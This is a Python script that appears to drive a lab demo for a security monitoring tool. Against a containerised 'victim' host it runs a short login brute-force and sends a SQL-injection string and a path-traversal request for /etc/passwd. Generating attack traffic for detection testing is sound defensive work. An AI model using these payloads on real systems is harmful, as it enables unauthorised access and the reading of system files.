import os
import socket
import sys
import time
import urllib.parse
import urllib.request

TARGET_HOST = os.environ.get("TARGET_HOST", "victim")
SSH_PORT = int(os.environ.get("SSH_PORT", "2222"))
WEB_PORT = int(os.environ.get("WEB_PORT", "8080"))


def try_login(user: str, password: str) -> None:
    with socket.create_connection((TARGET_HOST, SSH_PORT), timeout=5) as connection:
        connection.recv(256)
        connection.sendall(f"LOGIN {user} {password}\n".encode("utf-8"))
        print(connection.recv(256).decode("utf-8", errors="replace").strip(), flush=True)


def run_ssh_attack(include_success: bool = False) -> None:
    print(f"=================================================================", flush=True)
    print(f"SCENARIO 1: SSH Brute-Force against Perimeter Bastion (3 Auth Failed)", flush=True)
    print(f"Target: {TARGET_HOST}:{SSH_PORT} (vpn-bastion / Compose network only)", flush=True)
    print(f"-----------------------------------------------------------------", flush=True)
    for attempt in range(1, 4):
        print(f"[*] Attempt {attempt}/3: LOGIN demo wrong-pass-{attempt}", flush=True)
        try_login("demo", f"wrong-pass-{attempt}")
        time.sleep(0.3)
    if include_success or os.environ.get("SSH_INCLUDE_SUCCESS", "").lower() == "true":
        print(f"[*] Attempt 4: LOGIN demo lab-only-password (credential breach)", flush=True)
        try_login("demo", "lab-only-password")
    print(f"[+] SSH attack sequence finished (3 failed attempts logged).\n", flush=True)


def send_web_request(path: str, label: str) -> None:
    url = f"http://{TARGET_HOST}:{WEB_PORT}{path}"
    print(f"[*] Sending {label} payload to {url}...", flush=True)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "SentinelGraph-Attacker-Agent/1.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            content = resp.read().decode("utf-8", errors="replace").strip().replace("\r", "").replace("\n", " ")
            print(f"    [Response HTTP {resp.status}]: {content[:70]}", flush=True)
    except urllib.error.HTTPError as err:
        body = err.read().decode("utf-8", errors="replace").strip().replace("\r", "").replace("\n", " ")
        print(f"    [Response HTTP {err.code}]: {body[:70]}", flush=True)
    except Exception as exc:
        print(f"    [Error]: {exc}", flush=True)


def run_web_attack() -> None:
    print(f"=================================================================", flush=True)
    print(f"SCENARIO 2: Web Application Exploit against Web Portal", flush=True)
    print(f"Target: {TARGET_HOST}:{WEB_PORT} (web-portal / Customer Web Portal)", flush=True)
    print(f"-----------------------------------------------------------------", flush=True)

    # 1. Benign probe
    send_web_request("/health", "Health probe")
    time.sleep(0.3)

    # 2. SQL Injection payload containing "' OR 1=1"
    sqli_path = "/login?user=admin'%20OR%201=1--"
    send_web_request(sqli_path, "SQL Injection (' OR 1=1)")
    time.sleep(0.3)

    # 3. Path Traversal payload containing "../"
    traversal_path = "/view?page=../../../../etc/passwd"
    send_web_request(traversal_path, "Directory Traversal (../)")
    time.sleep(0.3)

    print(f"[+] Web exploit sequence finished.\n", flush=True)


if __name__ == "__main__":
    scenario = os.environ.get("ATTACK_SCENARIO", "").strip().lower()
    if not scenario and len(sys.argv) > 1:
        scenario = sys.argv[1].strip().lower()

    print(f"SAFE DEMO LAUNCHER: target={TARGET_HOST} (Compose isolated network)", flush=True)

    if scenario == "web":
        run_web_attack()
    elif scenario == "ssh":
        run_ssh_attack()
    else:
        # Default or 'all': run web attack if specified or ssh then web
        # If user explicitly called default attacker container, run requested scenario
        run_ssh_attack()
        time.sleep(0.5)
        run_web_attack()

    print("SAFE DEMO COMPLETE: no external target was contacted", flush=True)

